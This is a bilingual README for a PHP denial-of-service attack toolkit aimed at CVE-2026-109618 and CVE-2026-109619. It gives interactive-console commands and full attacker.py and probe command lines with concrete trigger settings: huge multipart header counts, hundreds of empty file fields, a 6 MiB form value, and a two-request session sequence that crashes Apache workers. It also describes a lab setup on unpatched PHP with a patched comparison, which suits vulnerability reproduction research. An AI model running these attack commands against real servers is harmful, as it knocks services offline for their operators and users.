# PHP CVE-2026-109618 / CVE-2026-109619 — DoS Attack Toolkit

**[中文](#中文说明) | [English](#english)**

---

## English

> Not based on ELF manipulation. Not related to the pseudo-PoCs from Is4yev/php2shell-poc or eness/php2shell.

Universal DoS attack toolkit for PHP CVE-2026-109618 and CVE-2026-109619.

### Interactive Console

```bash
python interactive.py
# or with target:
python interactive.py http://target:8088
```

```
Commands:
  target <url>                Set target URL (e.g. http://192.168.1.10:8088)
  show                        Show current settings
  health                      Send health check to target
  109618 [strategy]           Execute CVE-2026-109618 OOM attack
                              Strategies: part-headers, empty-files, form-value, files-registration
  109619                      Execute CVE-2026-109619 cross-request crash (fatal-backtrace)
  session                     Execute CVE-2026-109619 session lifecycle probe
  set <key> <value>           Set parameter (see 'set' for list)
  help                        Show this help
  exit / quit                 Exit
```

### Two DoS Paths

#### CVE-2026-109618: Multipart Parsing OOM Crash

Crafted multipart request bodies trigger OOM (out-of-memory) during PHP's request parsing phase, crashing the Apache worker.

Three OOM trigger strategies:
- **part-headers** — a single multipart part with massive custom headers (default 5000, max 150000)
- **empty-files** — many empty file fields (default 500, max 10000)
- **form-value** — a single 6 MiB form value (requires `memory_limit 8M`)

```bash
# Dry run (generates JSON only, no requests sent)
python attacker.py 109618 --target http://192.168.56.10:8088

# Execute (part-headers strategy)
python attacker.py 109618 --target http://192.168.56.10:8088 --health oom/health.php --upload oom/upload.php --part-headers 150000 --execute --report report-109618.json

# Execute (empty-files strategy)
python attacker.py 109618 --target http://192.168.56.10:8088 --oom-strategy empty-files --empty-files 500 --execute --report report-109618-empty.json

# Execute (form-value strategy, target needs memory_limit=8M)
python attacker.py 109618 --target http://192.168.56.10:8088 --upload oom/upload.php --oom-strategy form-value --field-bytes 6291456 --execute --report report-109618-form.json
```

#### CVE-2026-109619: Cross-Request Heap Corruption via Session

A two-step A→B sequence: Request A (producer) triggers a fatal error/OOM while session upload-progress is active, leaving stale state; Request B (consumer) on the same worker accesses freed heap data, crashing the worker.

```bash
# Dry run
python attacker.py 109619 --target http://192.168.56.10:8088

# Execute (fatal-backtrace → early INI consumer)
python attacker.py 109619 --target http://192.168.56.10:8088 --consumer early/health.php --execute --report report-109619.json
```

**Session lifecycle probe** (finer-grained 109619 reproduction):

```bash
# A→B sequence with session upload-progress
python session_progress_probe.py --target http://target:8088 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-old.json

# Comparison against patched version
python session_progress_probe.py --target http://target:8089 --expected-php 8.5.12 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-patched.json
```

**Availability probe** (measures DoS duration):

```bash
python availability_probe.py --target http://target:8088 --expected-php 8.5.11 --report availability-old.json --execute
python availability_probe.py --target http://target:8089 --expected-php 8.5.12 --report availability-patched.json --execute
```

### File Layout

```
DoS-Attack/
├── interactive.py               # Interactive DoS console (REPL)
├── attacker.py                  # Main attack tool (109618 OOM + 109619 cross-request)
├── availability_probe.py        # Availability measurement (109619 A→B + continuous health sampling)
├── session_progress_probe.py    # Session upload-progress lifecycle diagnostic
├── probe.py                     # Simple probe
├── README.md                    # This file
└── public/                      # Target-side PHP files (place in Apache DocumentRoot)
    ├── health.php               # Health check (returns PHP version/SAPI/PID)
    ├── upload.php               # General multipart upload endpoint
    ├── fatal.php                # Fatal error producer (exception)
    ├── fatal-backtrace.php      # Fatal error producer (E_USER_ERROR)
    ├── .htaccess.example        # Early INI consumer config example
    └── session/
        ├── health.php           # Session area health check
        ├── upload.php           # Session area upload endpoint
        ├── session-seed.php     # Session ID acquisition endpoint
        └── .htaccess.example    # Session area config (memory_limit + strict_mode)
```

### Target Preparation

1. Install unpatched PHP 8.5.11 + Apache `mod_php` (prefork, single worker)
2. Set `public/` as DocumentRoot
3. Verify `GET /health.php` returns the `official-cve-lab-v1` marker
4. For the 109618 OOM path: set `memory_limit 8M` in the `oom/` subdirectory
5. For the 109619 backtrace path: place `.htaccess` in the `early/` subdirectory
6. Prepare a PHP 8.5.12 comparison environment

### References

- [CVE-2026-109618 Advisory](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [CVE-2026-109619 Advisory](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [PHP Security Fix Commit](https://github.com/php/php-src/commit/31c0ea7d7ff1d1fccb6492e52dab544011628065)

### Verdict Criteria

HTTP 500, connection reset, worker PID change, or OOM **alone are insufficient to prove a CVE**. ASAN/debugger analysis targeting the official internal path is needed, along with patched-version comparison. The tools never claim success — verdict is always `not_determined`.

---

## 中文说明

> 不借助 ELF，不是以下两个伪 PoC 的类似原理。
> Is4yev/php2shell-poc
> eness/php2shell

PHP CVE-2026-109618 和 CVE-2026-109619 的通用拒绝服务攻击工具集。

### 交互控制台

```bash
python interactive.py
# 或直接指定目标：
python interactive.py http://target:8088
```

```
Commands:
  target <url>                设置目标 URL（如 http://192.168.1.10:8088）
  show                        显示当前设置
  health                      发送健康检查
  109618 [strategy]           执行 CVE-2026-109618 OOM 攻击
                              策略: part-headers, empty-files, form-value, files-registration
  109619                      执行 CVE-2026-109619 跨请求崩溃
  session                     执行 CVE-2026-109619 Session 生命周期探针
  set <key> <value>           设置参数（输入 set 查看列表）
  help                        显示帮助
  exit / quit                 退出
```

### 两条 DoS 路径

#### CVE-2026-109618：Multipart 解析 OOM 崩溃

通过构造特殊的 multipart 请求体，在 PHP 请求解析阶段触发 OOM（内存耗尽），导致 Apache worker 异常退出。

三种 OOM 触发策略：
- **part-headers** — 单个 multipart part 附加大量自定义头（默认 5000，上限 150000）
- **empty-files** — 大量空文件字段（默认 500，上限 10000）
- **form-value** — 单个 6 MiB 表单值（配合 `memory_limit 8M`）

```bash
# Dry run（只生成 JSON，不发请求）
python attacker.py 109618 --target http://192.168.56.10:8088

# 执行攻击（part-headers 策略）
python attacker.py 109618 --target http://192.168.56.10:8088 --health oom/health.php --upload oom/upload.php --part-headers 150000 --execute --report report-109618.json

# 执行攻击（empty-files 策略）
python attacker.py 109618 --target http://192.168.56.10:8088 --oom-strategy empty-files --empty-files 500 --execute --report report-109618-empty.json

# 执行攻击（form-value 策略，需目标 memory_limit=8M）
python attacker.py 109618 --target http://192.168.56.10:8088 --upload oom/upload.php --oom-strategy form-value --field-bytes 6291456 --execute --report report-109618-form.json
```

#### CVE-2026-109619：Session 跨请求堆破坏

两步 A→B 序列：请求 A（producer）在 session upload-progress 活跃时触发 fatal error/OOM，留下残留状态；同一 worker 的请求 B（consumer）访问到已释放的堆数据，导致 worker 崩溃。

```bash
# Dry run
python attacker.py 109619 --target http://192.168.56.10:8088

# 执行攻击（fatal-backtrace → early INI consumer）
python attacker.py 109619 --target http://192.168.56.10:8088 --consumer early/health.php --execute --report report-109619.json
```

**Session 生命周期探针**（更精细的 109619 复现）：

```bash
# 带 session upload-progress 的 A→B 序列
python session_progress_probe.py --target http://target:8088 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-old.json

# 对照修补版
python session_progress_probe.py --target http://target:8089 --expected-php 8.5.12 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-patched.json
```

**可用性探针**（度量 DoS 持续时间）：

```bash
python availability_probe.py --target http://target:8088 --expected-php 8.5.11 --report availability-old.json --execute
python availability_probe.py --target http://target:8089 --expected-php 8.5.12 --report availability-patched.json --execute
```

### 文件说明

```
DoS-Attack/
├── interactive.py               # 交互式 DoS 控制台（REPL）
├── attacker.py                  # 主攻击工具（109618 OOM + 109619 跨请求）
├── availability_probe.py        # 可用性度量（109619 A→B + 持续健康采样）
├── session_progress_probe.py    # Session upload-progress 生命周期诊断
├── probe.py                     # 简易探针
├── README.md                    # 本文件
└── public/                      # 靶机端 PHP 文件（放入 Apache DocumentRoot）
    ├── health.php               # 健康检查（返回 PHP 版本/SAPI/PID）
    ├── upload.php               # 通用 multipart 上传端点
    ├── fatal.php                # Fatal error producer（异常）
    ├── fatal-backtrace.php      # Fatal error producer（E_USER_ERROR）
    ├── .htaccess.example        # 早期 INI consumer 配置示例
    └── session/
        ├── health.php           # Session 区域健康检查
        ├── upload.php           # Session 区域上传端点
        ├── session-seed.php     # Session ID 获取端点
        └── .htaccess.example    # Session 区域配置（memory_limit + strict_mode）
```

### 靶机准备

1. 安装未修补的 PHP 8.5.11 + Apache `mod_php`（prefork，单 worker）
2. 将 `public/` 设为 DocumentRoot
3. 确认 `GET /health.php` 返回 `official-cve-lab-v1` 标记
4. 109618 OOM 路径：在 `oom/` 子目录设置 `memory_limit 8M`
5. 109619 backtrace 路径：在 `early/` 子目录放置 `.htaccess`
6. 准备 PHP 8.5.12 对照环境

### 参考资料

- [CVE-2026-109618 公告](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [CVE-2026-109619 公告](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [PHP 安全修复提交](https://github.com/php/php-src/commit/31c0ea7d7ff1d1fccb6492e52dab544011628065)

### 判定边界

HTTP 500、连接重置、worker PID 变化或 OOM **都不足以单独证明 CVE**。需要 ASAN/调试器定位到官方描述的内部路径，并对照修补版本。工具不会宣称成功，verdict 始终为 `not_determined`。
